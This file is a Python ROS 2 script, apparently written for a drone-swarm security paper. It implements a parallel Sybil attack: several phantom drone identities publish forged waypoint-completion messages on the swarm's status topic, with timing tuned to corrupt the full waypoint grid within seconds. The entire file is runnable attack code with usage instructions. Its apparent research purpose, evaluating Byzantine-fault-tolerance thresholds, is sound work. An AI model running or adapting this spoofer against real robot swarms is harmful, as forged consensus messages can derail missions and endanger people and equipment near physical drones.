#!/usr/bin/env python3
"""
sybil_attacker_lite.py
======================
Sybil / BFT-threshold attack for the T-ITS extension. Injects f+1
phantom drone identities in parallel, each publishing its own slice
of the waypoint grid simultaneously. This faithfully models the
threat: any network-adjacent attacker can spawn arbitrarily many
DDS participants, each indistinguishable from a legitimate drone,
and have them all publish in parallel.

Implementation: a single rclpy node with N independent per-phantom
schedules driven by a fast (50ms) tick. Each schedule advances its
own waypoint index at the configured spoof_delay rate, independent
of the others. Total injection time is therefore one phantom's
share of the grid, not the sum.

For the headline experiment at N_real=10 with f=3 (so f+1=4 phantoms),
each phantom injects ~22 waypoints at 0.5s spoof_delay, completing
in ~11 seconds. The full 90-waypoint grid is poisoned by t=14 from
launch (3s discovery + 11s parallel injection), well before mission
completion at t~35s.

Usage
-----
python3 sybil_attacker_lite.py \
        --num-real 10 --num-phantoms 4 --total-wp 90 \
        --discovery-time 3.0 --spoof-delay 0.5
"""

import argparse
import json
import time

import rclpy
from rclpy.node import Node
from std_msgs.msg import String


class ParallelSybilAttacker(Node):
    def __init__(self, num_real, num_phantoms, total_wp,
                 discovery_time, spoof_delay):
        super().__init__('sybil_attacker_lite')
        self.num_real = num_real
        self.num_phantoms = num_phantoms
        self.total_wp = total_wp
        self.discovery_time = discovery_time
        self.spoof_delay = spoof_delay

        self.pub = self.create_publisher(
            String, '/swarm/waypoint_status', 10)

        # Build a per-phantom schedule: waypoint slice + injection
        # cursor + last-inject timestamp. The first injection happens
        # discovery_time seconds after start, then every spoof_delay
        # seconds thereafter, independently per phantom.
        per_phantom = total_wp // num_phantoms
        self.phantom_schedules = []
        for i in range(num_phantoms):
            phantom_id = f'drone{num_real + 1 + i}'
            start = i * per_phantom
            end = ((i + 1) * per_phantom
                   if i < num_phantoms - 1 else total_wp)
            self.phantom_schedules.append({
                'id': phantom_id,
                'wps': list(range(start, end)),
                'index': 0,
                'last_inject': 0.0,
                'started': False,
            })

        self.start_time = time.time()
        self.tick_period = 0.05
        self.create_timer(self.tick_period, self.tick)

        self.get_logger().info(
            f'Parallel Sybil armed: N_real={num_real}, '
            f'phantoms={num_phantoms}, total_wp={total_wp}, '
            f'discovery={discovery_time}s, delay={spoof_delay}s. '
            f'Each phantom owns ~{per_phantom} WPs '
            f'(~{per_phantom * spoof_delay:.1f}s of injection).')

    def tick(self):
        now = time.time()
        elapsed = now - self.start_time

        # Hold injection until discovery window ends.
        if elapsed < self.discovery_time:
            return

        # Each phantom advances independently. They share the tick
        # but not the cursor — this is what makes them parallel.
        for sched in self.phantom_schedules:
            if sched['index'] >= len(sched['wps']):
                continue
            if not sched['started']:
                sched['started'] = True
                sched['last_inject'] = now - self.spoof_delay
            if now - sched['last_inject'] < self.spoof_delay:
                continue
            wp = sched['wps'][sched['index']]
            payload = json.dumps({'drone_id': sched['id'],
                                  'waypoint_id': wp})
            msg = String()
            msg.data = payload
            self.pub.publish(msg)
            sched['index'] += 1
            sched['last_inject'] = now


def main():
    p = argparse.ArgumentParser()
    p.add_argument('--num-real', type=int, default=10,
                   help='Number of legitimate drones in the swarm')
    p.add_argument('--num-phantoms', type=int, default=4,
                   help='Number of phantom identities to inject (f+1)')
    p.add_argument('--total-wp', type=int, default=90)
    p.add_argument('--discovery-time', type=float, default=3.0)
    p.add_argument('--spoof-delay', type=float, default=0.5)
    args = p.parse_args()

    rclpy.init()
    a = ParallelSybilAttacker(args.num_real, args.num_phantoms,
                              args.total_wp, args.discovery_time,
                              args.spoof_delay)
    try:
        rclpy.spin(a)
    except KeyboardInterrupt:
        pass
    finally:
        a.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
